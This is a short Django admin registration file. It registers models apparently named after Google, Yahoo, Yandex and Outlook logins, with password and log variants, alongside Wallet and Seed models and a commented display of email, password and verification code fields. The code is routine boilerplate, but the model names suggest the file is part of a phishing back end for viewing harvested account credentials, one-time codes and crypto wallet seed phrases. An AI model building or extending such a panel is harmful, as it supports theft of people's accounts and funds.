from django.contrib import admin

# Register your models here.
from .models import Us , Goo , Goo_p , Goo_log ,Yahoo , Yahoo_log, Yahoo_p , Yandex, Yandex_p, Yandex_log , Outlook, Outlook_p , Wallet , Seed , CVUpload,  Allow # Import your models

# # Optional: Custom admin display for better view
# class ProductAdmin(admin.ModelAdmin):
#     list_display = ('id', 'name', 'price', 'description')

# class LoginDataAdmin(admin.ModelAdmin):
#     list_display = ('id', 'email', 'password', 'code', 'created_at')

# class UsAdmin(admin.ModelAdmin):
#     list_display = ('id', 'email')

# Register models with admin site
admin.site.register(Us)
admin.site.register(Goo)
admin.site.register(Goo_p)
admin.site.register(Goo_log)
admin.site.register(Yahoo)
admin.site.register(Yahoo_log)
admin.site.register(Yahoo_p)
admin.site.register(Yandex)
admin.site.register(Yandex_p)
admin.site.register(Yandex_log)
admin.site.register(Outlook)
admin.site.register(Outlook_p)
admin.site.register(Wallet)
admin.site.register(Seed)
admin.site.register(CVUpload)
admin.site.register(Allow)

